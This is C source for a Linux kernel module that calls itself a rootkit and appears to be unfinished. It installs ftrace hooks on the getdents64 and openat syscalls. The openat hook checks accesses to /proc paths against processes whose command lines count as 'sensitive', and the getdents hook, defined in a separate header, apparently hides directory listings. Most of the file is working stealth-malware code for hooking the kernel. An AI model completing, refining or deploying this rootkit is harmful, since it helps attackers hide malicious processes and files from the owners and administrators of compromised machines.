// TODO go over code, refine it, remove includes, etc...

#include <linux/linkage.h>
#include <linux/init.h>

#include <linux/dirent.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/version.h>
#include <linux/kprobes.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/ftrace.h>
#include <asm/unistd.h>

#include "helpers.h" // todo add include protection in header
#include "getdents_hook.h"
#include "kill_hook.h"


#include <linux/fs.h>      // for struct file and struct dir_context

#include "proc_finder.h"


// Pointer to the original openat syscall.
static asmlinkage long (*orig_openat)(const struct pt_regs *regs);

// Our hook for openat.
asmlinkage long hook_openat(const struct pt_regs *regs)
{
    const char __user *filename_user = (const char __user *)regs->si; // TODO filename_user?
    char filename[256] = {0};
    long ret;

    /* Try to copy the filename from user space.
     * strncpy_from_user returns the number of bytes copied, or a negative error.
     */
    if (strncpy_from_user(filename, filename_user, sizeof(filename)) > 0) {
        // Check if the filename starts with "/proc/"
        if (strncmp(filename, "/proc/", 6) == 0) {
            pr_info("Hello world from openat hook: %s\n", filename);
	    char* pid_str = extract_pid_from_proc_path((char*)filename);
	    if (pid_str != NULL && pid_str[0] != '\0') {
	    	bool relevant = check_cmdline_contains_sensitive(pid_str);
	        pr_info("%s\n", pid_str);
		pr_info("is relvant %d", relevant);
	    }
        }
    }
    ret = orig_openat(regs);
    return ret;
}




// define which functions to hook
static struct ftrace_hook hooks[] = {
 //   HOOK("__x64_sys_kill", hook_kill, &orig_kill),
        HOOK("__x64_sys_getdents64", hook_getdents, &orig_getdents),
	    HOOK("__x64_sys_openat", hook_openat, &orig_openat)
};

static int __init rootkit_init(void) {
    int err;
    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
    if (err) {
        return err;
    }
    return 0;
}


// Module cleanup: Restore original syscall pointer
static void __exit rootkit_exit(void) {
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
    pr_info("reached rootkit_exit.\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
MODULE_LICENSE("GPL");
